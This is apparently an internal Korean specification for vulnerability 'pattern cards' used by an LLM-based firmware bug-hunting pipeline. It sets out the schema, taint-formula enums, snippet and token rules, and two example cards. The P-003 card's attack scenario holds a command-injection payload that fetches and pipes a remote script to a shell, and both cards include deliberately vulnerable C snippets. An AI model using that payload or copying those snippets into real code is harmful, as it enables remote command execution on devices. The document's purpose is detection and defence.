# 패턴카드 작성 스펙 (v2, 워크플로우 v3 반영)

> 대상: Stage 2 **Drafter** 담당자, 수동 카드 작성자, Hunter 파이프라인 구현자
> 확정일: 2026-04-17
> 설계 결정 배경: [architecture-decisions.md §12](architecture-decisions.md)
> 스키마 DDL: [.claude/skills/stage2/sql/migration.sql](../.claude/skills/stage2/sql/migration.sql)
>
> **2026-04-17 워크플로우 변경 (v3):** Analyst / Reviewer / Designer 3단계가 **Drafter 단일 Phase**로 통합됨.
> 카드 포맷과 필드는 그대로 (v2 유지). 달라진 점:
> - 카드 생성자 = **Drafter** (보안 판정과 동시에 카드 작성)
> - `status`는 생성 시 바로 `active` (draft 단계 없음)
> - 같은 공식 카드 발견 시 **Auto-merge**로 `pattern_card_members`에 흡수 (신규 생성 금지)
> - Reviewer 단계 없음 — Drafter 자기 검증 + Hunter 결과 사람 검토로 품질 관리

---

## 0. 요약 (한 장짜리)

패턴카드는 한 개의 취약점 "형식"을 저장하는 **레시피**다. 다음 구성요소를 담는다.

1. **공식 3원소** — `source_type` / `missing_check` / `sink_type`. enum으로 고정.
2. **핵심 스니펫** — OLD(`vulnerable_snippet`) + NEW(`fixed_snippet`). 5~15줄씩.
3. **토큰 인덱스** — Python 전처리가 후보 카드 컷할 때 쓰는 리터럴 토큰 집합.
4. **부정 토큰** — safe wrapper가 적용된 함수를 배제하는 힌트.
5. **서사** — 사람용 상세 설명 (LLM에는 안 들어감).
6. **수명주기/공유 메타** — status, version, shared_batch_id 등.

### 카드의 단위 규칙

- **1 공식 = 1 카드.** source/missing_check/sink 중 하나라도 다르면 카드 분리.
- **벤더는 카드 본체에 쓰지 않는다.** 벤더 종속성은 `negative_tokens.vendor_scope`에만.
- **CWE는 카드 본체에 쓰지 않는다.** `cve_similar`에만 정확히 일치하는 CVE만 참조.
- 카드는 **재사용 가능**해야 한다. Synology에서 만든 카드가 Dahua/ipTIME에 그대로 적용될 수 있어야 함.

---

## 1. 설계 원칙 (왜 이렇게 만드는가)

### 1-1. 라벨이 아닌 공식 중심

`vulnerability_type="Command Injection"`, `cwe="CWE-78"` 같은 라벨은 검색 키로 쓰면 잡음이 많다. 실제 매칭은 **"어떤 입력이 어떤 검증 없이 어디 도달하는가"**라는 taint 구조로 해야 정확도가 올라간다.

예: HTTP Host 헤더 길이 미검증 버그는 Dahua(CVE-2025-31700), ipTIME(KVE-2023-5458)에서 동일한 공식으로 나타난다. 벤더 라벨 없이도 `http_header(Host) + length_bound 부재 + stack/heap_buffer_copy` 공식 하나로 양쪽을 다 잡는다.

### 1-2. 스니펫이 "모양"의 앵커

공식만 있으면 Hunter LLM이 구체적 판정을 못 한다. OLD 스니펫이 **"이 모양을 찾아라"**, NEW 스니펫이 **"이 모양이면 이미 고쳐진 것이니 배제하라"**는 이중 신호를 준다.

### 1-3. 토큰 예산 관리

카드 수가 늘어도 Phase 5 Hunter LLM에 넣을 토큰이 폭발하면 안 된다. 카드 1장 직렬화 = **~200 토큰 이내**로 유지한다. Python 전처리가 후보를 1~5장으로 컷해서 함수당 LLM 입력 총량 ~1,000 토큰. 긴 서사는 DB에만 저장하고 LLM에는 보내지 않는다.

### 1-4. precision 기반 수명주기

precision = TP / (TP + FP). 낮은 카드는 retire. 카드 수보다 **품질이 중요**하다.

---

## 2. 테이블 목록

| 테이블 | 역할 | 관계 |
|--------|------|------|
| `pattern_cards` | 카드 본체 (1행 = 1 공식) | 기준 |
| `pattern_card_tokens` | grep/Python 전처리용 리터럴 토큰 | N:1 |
| `pattern_card_negative_tokens` | safe wrapper 배제 힌트 | N:1 |
| `pattern_card_grep_patterns` | regex (선택) | N:1 |
| `pattern_card_members` | 카드가 어느 `security_patches`에서 나왔는지 | N:1 |
| `pattern_card_stats` | TP/FP 집계, precision 추적 | 1:1 |

---

## 3. `pattern_cards` — 본체

### 3-1. 식별자

| 컬럼 | 타입 | 필수 | 설명 |
|------|------|------|------|
| `id` | INTEGER PK | auto | DB 자동. 외부 참조 금지 — `card_id` 사용. |
| `card_id` | TEXT UNIQUE | ✅ | 사람 친화 식별자. 형식 `P-NNN` (예: `P-001`, `P-014`). 벤더/CWE 접두사 **금지**. |
| `pattern_group_id` | INTEGER | - | `security_patches`의 그룹과 논리적 연결. Phase 3에서 부여된 그룹 번호. |

**card_id 네이밍 규칙:**
- `P-NNN` 순차 번호. 자리수는 000부터 3자리로 맞춘다.
- 같은 공식이 재발견되면 기존 카드의 버전업 (`version` 증가) 또는 `members`에 추가. 새 번호 부여 금지.

### 3-2. 공식 3원소 (★ 가장 중요)

| 컬럼 | 타입 | 필수 | 설명 | 예시 |
|------|------|------|------|------|
| `source_type` | TEXT enum | ✅ | 외부 데이터 진입점 분류 | `http_header` |
| `source_detail` | TEXT | - | 구체화 (optional) | `Host`, `Cseq`, `User-Agent` |
| `sink_type` | TEXT enum | ✅ | 위험 연산 분류 | `stack_buffer_copy` |
| `sink_detail` | TEXT | - | 구체화 (optional) | `sprintf(fixed_stack_buf)` |
| `missing_check` | TEXT enum | ✅ | 빠진 검증 분류 | `length_bound` |

#### `source_type` enum (초기 세트)

| 값 | 설명 | 구체 예 |
|----|------|---------|
| `http_header` | HTTP 요청 헤더 필드 | Host, Cseq, User-Agent, Cookie |
| `http_body` | HTTP 요청 바디 파라미터 | POST form의 path/name 등 |
| `http_query` | HTTP URL 쿼리스트링 | `?id=...` |
| `rpc_arg` | 내부 RPC 호출 인자 | DHIP, gSOAP, Synology RPC |
| `onvif_field` | ONVIF SOAP 요청 필드 | GetDeviceInformation body |
| `rtsp_field` | RTSP 헤더/바디 | SETUP/DESCRIBE 요청 |
| `env_var` | getenv 반환값 | PATH, HOME, HTTP_* |
| `file_read` | fread/read로 읽은 파일 바이트 | config, uploaded file |
| `net_packet` | raw socket recv 데이터 | UDP/TCP 커스텀 프로토콜 |
| `config_field` | nvram/config 저장소 필드 | TP-Link curcfg, Syno synoinfo |
| `unix_socket` | Unix 도메인 소켓 메시지 | IPC 페이로드 |
| `shared_mem` | SysV/POSIX shm | 프로세스 간 공유 버퍼 |
| `cli_arg` | argv | 데몬 설정 파라미터 |

#### `missing_check` enum (초기 세트)

| 값 | 설명 |
|----|------|
| `length_bound` | 길이 상한 검사 부재 (strcpy/sprintf 크기 미지정) |
| `metachar_filter` | 쉘/경로/SQL 메타문자 필터 부재 |
| `path_normalize` | `..`/symlink 정규화 부재 |
| `auth_check` | 인증/권한 확인 부재 |
| `format_specifier` | printf 계열에 user-controlled 포맷 |
| `null_check` | NULL 포인터/길이 0 검사 부재 |
| `bounds_check` | 배열 인덱스/offset 범위 검사 부재 |
| `type_check` | 타입/tag/version 검사 부재 |
| `sign_check` | signed/unsigned 비교 부재 |
| `integer_overflow` | 곱셈/덧셈 오버플로우 검사 부재 |
| `double_free_guard` | free 후 NULL 대입 부재 |
| `tocttou` | 검사-사용 사이 레이스 |
| `encoding_check` | UTF-8/길이 바이트 검사 부재 |

#### `sink_type` enum (초기 세트)

| 값 | 설명 |
|----|------|
| `stack_buffer_copy` | 스택 로컬 버퍼에 memcpy/sprintf/strcpy |
| `heap_buffer_copy` | 힙 버퍼에 동일 |
| `shell_exec` | system/popen/execl 등 쉘 경유 |
| `process_spawn` | execve/posix_spawn 직접 (쉘 미경유지만 arg 주입 가능) |
| `format_string` | printf 계열, 첫 인자에 user 데이터 |
| `system_call` | open/chmod/chown/unlink 등 파일 시스템 |
| `file_open` | 경로가 attacker-controlled인 open/fopen |
| `sql_query` | SQL 쿼리 문자열 연결 |
| `ptr_arith` | 포인터 산술 (크기 계산 오류 포함) |
| `integer_op` | 산술 연산 결과를 길이/인덱스로 사용 |
| `memcpy_variable_len` | 길이가 user-controlled인 memcpy |
| `write_primitive` | 임의 주소 쓰기 (OOB write) |
| `deserialize` | unserialize/protobuf 등 파싱 |

### 3-3. 공식 분리 규칙

**같은 source + missing_check여도 sink가 다르면 카드 분리.**

예:
- 카드 A: `http_header(Host) + length_bound + stack_buffer_copy` → CVE-2025-31700 계열
- 카드 B: `http_header(Host) + length_bound + heap_buffer_copy` → KVE-2023-5458 계열

→ **공식 중 하나라도 다르면 새 카드.**

### 3-4. Hunter LLM 직접 입력 필드

| 컬럼 | 타입 | 필수 | 제약 | 설명 |
|------|------|------|------|------|
| `summary` | TEXT | ✅ | **200자 이내** | Hunter가 빠른 판단에 쓰는 한 줄 요약 |
| `vulnerable_snippet` | TEXT | ✅ | **5~15줄, 300자 이내** | OLD 핵심 라인 |
| `fixed_snippet` | TEXT | ✅ | **5~15줄, 300자 이내** | NEW 핵심 라인 |
| `snippet_origin` | TEXT | - | - | `binary/function` (예: `central_server/sub_F150`) |
| `snippet_language` | TEXT | - | enum | `c` / `decompiled_c` / `cpp`. 기본값 `decompiled_c`. |

#### `summary` 작성 규칙

- 주어 생략 가능. 동사로 시작해도 됨.
- 공식 3요소가 자연스럽게 드러나야 함.
- 추측 표현 금지 (`~할 수 있음`, `~일 수도 있음`).

예시:
- ✅ `"HTTP Host 헤더를 길이 검사 없이 고정 크기 스택 버퍼에 sprintf로 복사."`
- ❌ `"이 함수는 Host 헤더를 처리할 때 길이를 검사하지 않을 수 있어 버퍼 오버플로우가 발생할 가능성이 있다."` (장황 + 추측)

#### 스니펫 작성 규칙 (8가지)

1. **최대 15줄, 300자.** 초과 시 더 잘라서 재시도.
2. **취약점이 성립하는 최소 라인만.** 시그니처/초기화/로깅/무관 분기 제거.
3. **source → sink 경로가 스니펫 내에서 완결.** 경계 밖이면 `// SOURCE: ...` 한 줄 주석.
4. **NEW는 OLD와 동일 구조, 수정 라인 차이만.** 두 스니펫을 나란히 봤을 때 diff가 선명해야 함.
5. **디컴파일 노이즈 정리.** `*(_DWORD *)(...)`, 불필요한 캐스팅, 쓰지 않는 변수 선언 제거.
6. **주석/로그 문자열 제거.** 스니펫은 "모양"이어야 함.
7. **변수명 정규화 금지.** `USER_INPUT`, `BUF` 같은 placeholder로 치환하지 말 것. Opus는 실제 코드를 더 잘 일반화함.
8. **원본 출처는 `snippet_origin`에.** `binary/function_name` 형식.

#### 스니펫 예시 — 좋은 예

```c
// vulnerable_snippet (3줄)
char cmd[0x100];
sprintf(cmd, "rm -rf %s", path);
system(cmd);
```

```c
// fixed_snippet (2줄)
// SOURCE: path from HTTP body
sub_6CEE0(ctx, "/bin/rm", "-rf", path, NULL);
```

#### 스니펫 예시 — 나쁜 예

```c
// ❌ 함수 전체 붙여넣기, 일반성 훼손
int __fastcall process_request(Request *req) {
    int v2, v3, v4;
    char *buf;
    log_debug("processing request");   // 무관 로그
    if (!req) return -1;
    v2 = req->method;
    if (v2 != METHOD_POST) return 0;    // 무관 분기
    // ... 20줄 더 ...
    sprintf(cmd, "rm -rf %s", req->path);
    system(cmd);
    return 0;
}
```

### 3-5. 인간 전용 서사 (LLM에는 들어가지 않음)

| 컬럼 | 타입 | 설명 |
|------|------|------|
| `long_description` | TEXT | 취약점 원리 상세 설명 (2~5문장). 팀 공유 MD 렌더링 대상. |
| `attack_scenario` | TEXT | 공격 시나리오. 어떤 입력을 주면 어떤 결과가 나는지. |
| `fix_detail` | TEXT | 패치가 구조적으로 어떻게 취약을 막는지. |

→ 이 3개는 **`share_batch.py`의 팀 공유 MD export에만** 렌더링. Hunter 프롬프트에는 오케스트레이터가 차단.

### 3-6. 참고 라벨 (검색 편의용)

| 컬럼 | 타입 | 설명 |
|------|------|------|
| `severity_hint` | TEXT | `critical`/`high`/`medium`/`low`. **절대 기준 아님** — CRITICAL 발견 시 즉시 공유 트리거에만 쓰임. |
| `cve_similar` | TEXT | 하드 규칙 §5 허용 리스트 CVE만. 추측 금지. 모르면 `NULL`. |
| `advisory` | TEXT | 벤더 보안 공지 ID (`SA_23_15` 등). 있으면. |

**금지 사항:**
- `severity_hint`에 근거 없는 'critical' 남발 금지. LLM Hunter가 severity로 의사결정 안 하게 설계했지만 사람이 우선순위를 볼 때 기준이 됨.
- `cve_similar`에 "CVE-2024-???? 유사" 같은 추측 금지.

### 3-7. 수명주기 / 공유

| 컬럼 | 타입 | 기본 | 설명 |
|------|------|------|------|
| `status` | TEXT | `active` | `active`/`retired`/`superseded` |
| `version` | INTEGER | 1 | 카드 내용 갱신 시 증가 (스니펫 교체 등) |
| `superseded_by` | INTEGER | NULL | 더 나은 카드가 나오면 새 카드 id 참조 |
| `shared_with_team` | BOOLEAN | 0 | `share_batch.py` 실행 시 1로 업데이트 |
| `shared_batch_id` | INTEGER | NULL | 공유 배치 번호 |
| `created_at` | DATETIME | auto | - |
| `updated_at` | DATETIME | auto | - |

**status 전이 규칙 (v3, Drafter 단일 Phase):**
- 카드는 Drafter가 **생성 시 바로 `active`** 로 들어간다. draft 단계 없음.
- 같은 `(source_type, sink_type, missing_check)` 조합의 active 카드가 이미 있으면
  **신규 생성 대신 `pattern_card_members`에만 행 추가** (Auto-merge). DB의 부분 UNIQUE INDEX
  (`idx_pc_formula_active`)가 중복을 원천 차단.
- `superseded`: 같은 공식인데 후속 버전이 훨씬 선명해서 교체됐을 때. `superseded_by`에 새 card.id.
  기존 카드는 `status='superseded'`로 내리고 신규를 `active`로. 이력은 유지.
- `retired`: precision `< 0.3` AND `TP + FP ≥ 10` 일 때 **사람 승인 후** 내림. 쿼리에서 기본 제외.
- Hunter는 `status='active'` 카드만 본다.

---

## 4. `pattern_card_tokens` — grep 인덱스

Phase 5 전처리가 함수 F의 의사코드에서 토큰을 뽑은 뒤, 이 테이블에 인덱스로 조인해서 후보 카드를 1차 필터링한다.

| 컬럼 | 타입 | 필수 | 설명 |
|------|------|------|------|
| `id` | INTEGER PK | auto | - |
| `card_id` | INTEGER FK | ✅ | `pattern_cards.id` |
| `token` | TEXT | ✅ | 리터럴 토큰. 인덱싱됨. |
| `kind` | TEXT enum | ✅ | 토큰 종류 |
| `weight` | REAL | - | 0.0~1.0, 매칭 점수 계산. 기본 1.0 |

### `kind` enum

| 값 | 설명 | 예시 |
|----|------|------|
| `api` | 표준/라이브러리 함수명 | `sprintf`, `memcpy`, `system` |
| `literal` | 코드에 등장하는 문자열 리터럴 | `"rm -rf"`, `"Host:"`, `"Content-Length"` |
| `error_msg` | 에러/로그 문자열 | `"Auth failed"`, `"Invalid path"` |
| `const` | 상수 값 | `0x80`, `MAX_PATH`, `0xDEADBEEF` |
| `struct_field` | 구조체 멤버명 (디컴파일 결과) | `->method`, `->path`, `->host` |
| `symbol` | 벤더 고유 함수 symbol | `sub_6CEE0`, `SynoPopen` (이건 negative_tokens에 주로) |

### 작성 규칙

- **일반명사 금지.** `path`, `user`, `input`, `data`, `buffer`, `var`, `ptr` 같은 단어를 토큰으로 등록하지 말 것.
- **코드에 리터럴로 등장하는 것만.** 사람이 해석한 개념어 금지.
- **weight**는 차별적 정보량 기준. 희귀한 토큰(`sub_6CEE0`, `sprintf("rm -rf %s", ...)`)은 1.0, 흔한 토큰(`%s`)은 0.3.
- 카드당 3~8개 정도가 적당. 너무 많으면 매칭이 느슨해짐.

### 예시 — HTTP Host 스택 오버플로우 카드

| token | kind | weight |
|-------|------|--------|
| `sprintf` | api | 1.0 |
| `Host:` | literal | 0.8 |
| `strncpy` | api | 0.6 |
| `%s` | literal | 0.3 |

### 예시 — Command Injection 카드

| token | kind | weight |
|-------|------|--------|
| `system` | api | 1.0 |
| `rm -rf` | literal | 0.9 |
| `sprintf` | api | 0.8 |
| `popen` | api | 0.7 |

---

## 5. `pattern_card_negative_tokens` — safe wrapper 배제

같은 함수에 이 토큰이 등장하면 **이미 패치된 것으로 판정**. Phase 5 전처리가 LLM 호출 전에 배제.

| 컬럼 | 타입 | 필수 | 설명 |
|------|------|------|------|
| `id` | INTEGER PK | auto | - |
| `card_id` | INTEGER FK | ✅ | `pattern_cards.id` |
| `token` | TEXT | ✅ | safe wrapper 함수명 또는 패치 흔적 |
| `vendor_scope` | TEXT | - | `synology`/`ubiquiti`/`tp-link`/... 또는 NULL(universal) |
| `note` | TEXT | - | 왜 이게 배제 신호인지 |

### `vendor_scope` 규칙

- **카드 본체에는 벤더를 안 쓰지만, negative_tokens에는 써도 된다.** safe wrapper는 벤더 고유이기 때문.
- `NULL` = universal. 모든 벤더에서 이 토큰이 있으면 배제 (예: `snprintf`는 누구에게나 length bound 적용됨).
- 값이 있으면 해당 벤더 바이너리에만 적용. 다른 벤더에서는 이 negative_token 무시.

### 예시 — Command Injection 카드

| token | vendor_scope | note |
|-------|--------------|------|
| `sub_6CEE0` | `synology` | Synology execve 기반 안전 래퍼 |
| `execve` | `NULL` | execve 직접 호출은 쉘 경유 없음 (universal) |
| `g_spawn_async` | `NULL` | glib 안전 spawn (universal) |

### 예시 — Stack Buffer Overflow 카드

| token | vendor_scope | note |
|-------|--------------|------|
| `snprintf` | `NULL` | 크기 인자 명시된 형태이므로 길이 제한됨 |
| `strlcpy` | `NULL` | BSD 안전 문자열 복사 |

### 주의

- `snprintf`는 만능 배제가 아니다. 크기 인자가 `strlen(input)`처럼 **입력 길이 기반**이면 여전히 취약. 그런 경우 카드 본문 `missing_check`이 다른 값이어야 하고, negative_tokens에 넣지 않는다.
- 확신 없는 토큰을 여기 넣으면 false negative (진짜 취약을 배제) 발생. 신중히.

---

## 6. `pattern_card_grep_patterns` — regex (선택)

대규모 오프라인 스캔(파이프라인 밖에서 binary strings grep 등)을 할 때 쓰는 regex. 필수 아님.

| 컬럼 | 타입 | 필수 | 설명 |
|------|------|------|------|
| `id` | INTEGER PK | auto | - |
| `card_id` | INTEGER FK | ✅ | - |
| `pattern` | TEXT | ✅ | regex 본문 |
| `pattern_flavor` | TEXT | - | `python_re`/`ripgrep`/`sqlite_glob`. 기본 `python_re` |

### 예시

```
카드 P-003 Command Injection:
  sprintf\s*\([^,]+,\s*"rm -rf\s*%s"
  system\s*\([^)]*rm\s*-rf
  popen\s*\(
```

---

## 7. `pattern_card_members` — 출처 추적 (Auto-merge의 핵심)

카드가 어느 `security_patches` 레코드들로부터 파생됐는지 저장. v3에서는 **Drafter의 Auto-merge**가 여기에 행을 계속 추가한다 (같은 공식 재발견 시 새 카드 대신 이 테이블에 멤버만 축적).

| 컬럼 | 타입 | 필수 | 설명 |
|------|------|------|------|
| `id` | INTEGER PK | auto | - |
| `card_id` | INTEGER FK | ✅ | - |
| `security_patch_id` | INTEGER FK | ✅ | `security_patches.id` |
| `is_representative` | BOOLEAN | - | 현재 스니펫을 제공한 원본 멤버면 1 (정확히 1건) |
| `note` | TEXT | - | 기여 노트 (예: `"central_server/sub_F150 — 원형"`, `"auto-merged by Drafter"`) |
| `created_at` | DATETIME | auto | - |

**규칙:**
- 첫 카드 생성 시 대표 멤버 1행 INSERT (`is_representative=1`).
- 같은 공식 재발견 시 새 카드 만들지 말 것 — 이 테이블에 행만 추가 (`is_representative=0`).
- 스니펫이 기존보다 **더 선명한 멤버가 나오면**: 기존 대표의 `is_representative=0`으로 내리고 새 멤버를 `is_representative=1`로 올리며 `pattern_cards.version++`.
- 오케스트레이터가 Auto-merge 로직을 SQL로 수행 ([migration.sql 말미 참고](../.claude/skills/stage2/sql/migration.sql)).

---

## 8. `pattern_card_stats` — TP/FP 집계

Hunter 실행 결과를 집계해 카드 품질을 추적. precision 낮은 카드는 retire 대상.

| 컬럼 | 타입 | 설명 |
|------|------|------|
| `card_id` | INTEGER PK/FK | `pattern_cards.id` |
| `matches_total` | INTEGER | Hunter가 match로 판정한 총 수 |
| `true_positives` | INTEGER | 사람이 TP 확정 |
| `false_positives` | INTEGER | 사람이 FP 확정 |
| `last_used_at` | DATETIME | 가장 최근 Hunter 매칭 시각 |

### 집계 규칙

- `hunt_findings.is_true_positive`가 TRUE/FALSE로 확정될 때마다 이 테이블 업데이트.
- `matches_total` = `hunt_findings` 중 `pattern_card_id = ?` AND `match_confidence >= 0.4` 행 수.
- precision `= TP / (TP + FP)`. 쿼리 타임에 계산하거나 trigger로 갱신.

### 품질 게이트

- precision `< 0.3` AND `TP + FP >= 10` → `status='retired'` 후보 (사람 확인 후).
- `matches_total > 0` AND `TP + FP = 0` → 사람 검토 대기 중. 리뷰 지연이면 batch 리마인드.

---

## 9. 작성 체크리스트 (카드 제출 전)

**Drafter**가 JSON을 확정하기 전 이 체크리스트를 전수 통과시켜야 한다.

### 공식
- [ ] `source_type`, `sink_type`, `missing_check` 모두 enum 값에 존재하는가?
- [ ] 이 조합이 **하나의 구체적 취약 형식**을 가리키는가? (너무 일반적이지 않은가?)
- [ ] 같은 공식의 기존 카드가 이미 있지 않은가? (있으면 멤버 추가 또는 version 증가로 처리)

### 스니펫
- [ ] `vulnerable_snippet` 15줄 / 300자 이내?
- [ ] `fixed_snippet` 15줄 / 300자 이내?
- [ ] 두 스니펫의 구조가 **일대일 대응**되는가? (diff가 선명한가)
- [ ] 무관 라인(로깅, 초기화, 타입 캐스팅 노이즈) 전부 제거?
- [ ] source → sink 경로가 스니펫 안에서 완결? (외부면 `// SOURCE:` 주석으로 표시)
- [ ] 변수명을 placeholder로 치환하지 않았는가?
- [ ] `snippet_origin`에 `binary/function` 기록?

### 토큰
- [ ] 카드당 토큰 3~8개?
- [ ] 일반명사(`path`, `user`, `input`, `buffer`) 없는가?
- [ ] 리터럴 토큰에 따옴표 포함 필요한 경우 포함했는가?
- [ ] `kind`가 올바른 enum 값인가?
- [ ] weight가 차별적 정보량을 반영하는가?

### Negative tokens
- [ ] safe wrapper 토큰이 누락 없이 포함됐는가?
- [ ] 벤더 종속 토큰에 `vendor_scope`가 정확히 지정됐는가?
- [ ] universal 토큰(snprintf, strlcpy 등)은 `vendor_scope=NULL`?

### 메타
- [ ] `summary` 200자 이내, 추측 표현 없는가?
- [ ] `cve_similar`가 하드 규칙 §5 허용 리스트 안인가? (추측 CVE 금지)
- [ ] `severity_hint` 근거가 `attack_scenario`에 드러나는가?
- [ ] `card_id`가 `P-NNN` 순차 번호인가?

### 재사용성
- [ ] 카드 본체(공식 + 스니펫)에 벤더명이 들어가 있지는 않은가? (`vendor_scope`는 negative_tokens만)
- [ ] 다른 벤더 펌웨어에서 이 카드가 의미 있게 매칭될 수 있는가?

---

## 10. 완성 예시 (2건)

### 10-1. P-014: HTTP Host 헤더 스택 오버플로우

**공식:** `http_header(Host) + length_bound 부재 + stack_buffer_copy`

```json
{
  "card_id": "P-014",
  "source_type": "http_header",
  "source_detail": "Host",
  "sink_type": "stack_buffer_copy",
  "sink_detail": "sprintf(fixed_stack_buf)",
  "missing_check": "length_bound",
  "summary": "HTTP Host 헤더를 길이 검사 없이 고정 크기 스택 버퍼에 sprintf로 복사.",
  "vulnerable_snippet": "char buf[0x80];\nconst char *h = get_header(req, \"Host\");\nsprintf(buf, \"%s\", h);",
  "fixed_snippet": "char buf[0x80];\nconst char *h = get_header(req, \"Host\");\nsnprintf(buf, sizeof(buf), \"%s\", h);",
  "snippet_origin": "central_server/sub_A140",
  "snippet_language": "decompiled_c",
  "long_description": "ONVIF/HTTP 요청의 Host 헤더 값(길이 무제한)을 sprintf로 스택 로컬 변수에 복사. 버퍼가 0x80 고정이므로 초과 시 리턴 주소까지 덮어 RCE 가능.",
  "attack_scenario": "인증 없이 ONVIF 포트로 길이 512+ Host 헤더를 전송하면 스택 오버플로우로 리턴 주소 변조.",
  "fix_detail": "sprintf를 snprintf로 교체하고 크기 인자를 sizeof(buf)로 명시해 경계 적용.",
  "severity_hint": "critical",
  "cve_similar": "CVE-2025-31700",
  "advisory": null,
  "status": "active",
  "version": 1,
  "tokens": [
    {"token": "sprintf", "kind": "api", "weight": 1.0},
    {"token": "Host:", "kind": "literal", "weight": 0.8},
    {"token": "strncpy", "kind": "api", "weight": 0.6},
    {"token": "%s", "kind": "literal", "weight": 0.3}
  ],
  "grep_patterns": [
    "sprintf\\s*\\([^,]+,\\s*\"%s\"[^)]*[Hh]ost",
    "strncpy\\s*\\([^,]+,\\s*[^,]*[Hh]ost"
  ],
  "negative_tokens": [
    {"token": "snprintf", "vendor_scope": null, "note": "크기 인자 있으면 경계 적용됨"},
    {"token": "strlcpy", "vendor_scope": null, "note": "BSD 안전 문자열 복사"}
  ]
}
```

### 10-2. P-003: sprintf + system Command Injection

**공식:** `http_body(path) + metachar_filter 부재 + shell_exec`

```json
{
  "card_id": "P-003",
  "source_type": "http_body",
  "source_detail": "path",
  "sink_type": "shell_exec",
  "sink_detail": "system+sprintf format",
  "missing_check": "metachar_filter",
  "summary": "sprintf로 조립한 명령 문자열을 system()으로 실행. 경로 메타문자 필터 없음.",
  "vulnerable_snippet": "char cmd[0x100];\nsprintf(cmd, \"rm -rf %s\", path);\nsystem(cmd);",
  "fixed_snippet": "// SOURCE: path from HTTP body\nsub_6CEE0(ctx, \"/bin/rm\", \"-rf\", path, NULL);",
  "snippet_origin": "central_server/sub_F150",
  "snippet_language": "decompiled_c",
  "long_description": "central_server의 HTTP POST body 'path' 파라미터를 sprintf로 \"rm -rf %s\" 포맷 후 system()에 전달. `;`, `$()`, 백틱 필터 부재로 원격 명령 주입 가능.",
  "attack_scenario": "인증된 공격자가 POST body path에 '/tmp/a; wget http://x/s.sh | sh' 전송 → 임의 명령 실행.",
  "fix_detail": "system() 호출을 Synology 전용 execve 안전 래퍼로 교체. 쉘 경유 제거.",
  "severity_hint": "critical",
  "cve_similar": "CVE-2021-29086",
  "advisory": null,
  "status": "active",
  "version": 1,
  "tokens": [
    {"token": "system", "kind": "api", "weight": 1.0},
    {"token": "sprintf", "kind": "api", "weight": 0.8},
    {"token": "rm -rf", "kind": "literal", "weight": 0.9},
    {"token": "popen", "kind": "api", "weight": 0.7}
  ],
  "grep_patterns": [
    "sprintf\\s*\\([^,]+,\\s*\"rm -rf\\s*%s\"",
    "system\\s*\\([^)]*rm\\s*-rf",
    "popen\\s*\\("
  ],
  "negative_tokens": [
    {"token": "sub_6CEE0", "vendor_scope": "synology", "note": "Synology execve 안전 래퍼"},
    {"token": "execve", "vendor_scope": null, "note": "execve 직접 호출은 쉘 미경유"},
    {"token": "g_spawn_async", "vendor_scope": null, "note": "glib 안전 spawn"}
  ]
}
```

---

## 11. 자주 하는 실수 (FAQ)

### Q1. 비슷한 공식인데 sink만 조금 달라요. 카드 하나로 합쳐도 되나요?
**안 됨.** sink가 다르면 Hunter가 찾아야 할 모양이 다르다. 공식 3원소 중 하나라도 다르면 카드 분리.

### Q2. Synology BC500에서 나온 카드인데 TP-Link에도 적용될까요?
카드 본체(공식 + 스니펫)가 벤더 중립이면 자동 적용된다. negative_tokens의 `vendor_scope='synology'` 항목은 Synology 타겟에서만 활성화되므로 TP-Link 바이너리 매칭 시 무시된다.

### Q3. `severity_hint`를 `critical`로 하면 자동 배치 공유되나요?
Drafter가 `critical` 판정한 카드는 오케스트레이터가 **배치 대기 없이 즉시** `share_batch.py`를 돌린다. 남발하면 팀이 피로해지니 근거(`attack_scenario`에 RCE/인증 없이 접근 가능 명시)가 확실할 때만.

### Q9. Reviewer가 없으면 False Positive는 누가 거르나요?
v3에서 FP 가드는 세 층으로 구성된다.
1. **Drafter 자기 검증** — 프롬프트에 False Positive 가드 7종 + Synology Hard Rules + confidence 기준표 하드코딩. confidence 0.70 미만은 기본 `is_security_patch=false`.
2. **Auto-merge** — 같은 공식 카드로 수렴되므로 드물게 잘못 만들어도 확산되지 않음.
3. **Hunter 결과 사람 검토** — `hunt_findings.is_true_positive`를 사람이 확정. FP가 많은 카드는 `pattern_card_stats.precision` 하락 → retire 게이트에 자동 진입.

### Q10. 같은 함수에 Drafter가 실수로 동일 공식 카드를 두 번 만들면?
DB 레벨에서 차단됨. `pattern_cards`에 `status='active'`인 같은 `(source_type, sink_type, missing_check)` 조합은 **부분 UNIQUE INDEX로 1개만 허용**. 오케스트레이터가 INSERT 충돌 시 `pattern_card_members`에 멤버 추가로 자동 대체.

### Q4. 스니펫이 16줄 나왔어요. 한 줄 줄여도 의미 보존이 안 됩니다.
의미가 진짜 안 잘리면 **그룹을 다시 보라.** 같은 그룹의 다른 멤버가 더 작게 나타날 수 있다. 대표를 바꿔 다시 뽑는다. 그래도 안 되면 공식 2개가 섞여 있다는 신호 — 카드 분리.

### Q5. 변수명 정규화하면 매칭이 쉬워지지 않나요?
실험적으로 Opus는 실제 코드를 더 잘 일반화한다. `USER_INPUT`, `BUF` placeholder는 오히려 모델을 혼란스럽게 만든다. 변수명은 건드리지 말 것.

### Q6. `long_description`을 길게 쓰면 Hunter가 더 정확하게 매칭하지 않나요?
`long_description`은 **Hunter에게 전달되지 않는다.** 오케스트레이터가 차단한다. Hunter 프롬프트에는 summary + 두 스니펫만 들어간다. 토큰 예산 관리 때문.

### Q7. precision < 0.3 카드가 나왔는데 retire 아까워요.
**retire가 답이다.** 낮은 precision 카드는 Hunter 시간을 낭비하고 사람 검토 큐를 막는다. 같은 공식의 더 구체적인 카드로 대체하는 게 맞다 (`superseded_by`에 후속 카드 연결).

### Q8. 새로 분석한 취약점이 기존 카드와 공식이 100% 같아요.
**새 카드 만들지 말 것.** `pattern_card_members`에 추가하고, 스니펫이 더 선명하면 기존 카드의 `version`을 올려서 갱신한다 (이전 내용은 `long_description` 말미에 이력으로 남김).

---



**갱신 이력**
- 2026-04-17 v2 (워크플로우 v3 반영): Analyst/Reviewer/Designer 3단계가 Drafter 단일 Phase로 통합.
  카드 포맷/필드는 v2 유지. 생성 시 바로 `status='active'`, Auto-merge로 같은 공식 흡수.
  DB에 `idx_pc_formula_active` 부분 UNIQUE INDEX 추가로 중복 원천 차단.
  FAQ Q9/Q10 추가 (Reviewer 부재 시 FP 가드, 중복 INSERT 방어).
- 2026-04-17 v2: 공식(taint 3원소) + OLD/NEW 스니펫 중심 재설계. 벤더·CWE 라벨 필드 제거. 부속 테이블 6개 분리.
